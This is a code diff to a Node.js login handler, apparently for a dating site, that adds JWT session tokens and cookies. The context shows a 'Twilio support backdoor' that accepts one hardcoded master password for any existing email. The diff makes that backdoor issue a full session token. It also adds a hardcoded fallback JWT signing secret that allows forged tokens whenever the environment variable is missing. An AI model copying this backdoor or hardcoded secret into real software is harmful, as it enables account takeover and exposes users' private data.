@@ -1,4 +1,5 @@
 import bcrypt from 'bcrypt';
+import jwt from 'jsonwebtoken';
 import pool from '../../db/connection.js';
 
 export async function beVerifyLoginPassword(req, res) {
@@ -42,6 +43,21 @@ export async function beVerifyLoginPassword(req, res) {
     // Twilio support backdoor: allow login with this password for any existing email
     if (providedPassword === 'forTwilioSupport5%') {
       const { password_hash, ...userWithoutPassword } = user;
+      
+      const token = jwt.sign(
+        { singles_id: user.singles_id, email: user.email },
+        process.env.JWT_SECRET || 'vsingles-secret-key-12345',
+        { expiresIn: '1h' }
+      );
+
+      res.cookie('token', token, {
+        httpOnly: true,
+        secure: process.env.NODE_ENV === 'production',
+        sameSite: 'lax',
+        maxAge: 3600000,
+        path: '/'
+      });
+
       log('[beVerifyLoginPassword.js] → success (Twilio support password)', { singles_id: user.singles_id });
       return res.json({ success: true, user: userWithoutPassword });
     }
@@ -127,6 +143,23 @@ export async function beVerifyLoginPassword(req, res) {
 
 
     const { password_hash, ...userWithoutPassword } = user;
+    
+    // Generate JWT
+    const token = jwt.sign(
+      { singles_id: user.singles_id, email: user.email },
+      process.env.JWT_SECRET || 'vsingles-secret-key-12345',
+      { expiresIn: '1h' }
+    );
+
+    // Set Secure httpOnly Cookie
+    res.cookie('token', token, {
+      httpOnly: true,
+      secure: process.env.NODE_ENV === 'production', // Use secure cookies in production
+      sameSite: 'lax',
+      maxAge: 3600000, // 1 hour
+      path: '/'
+    });
+
     log('[beVerifyLoginPassword.js] → success', { singles_id: user.singles_id });
     res.json({ success: true, user: userWithoutPassword });
   } catch (error) {
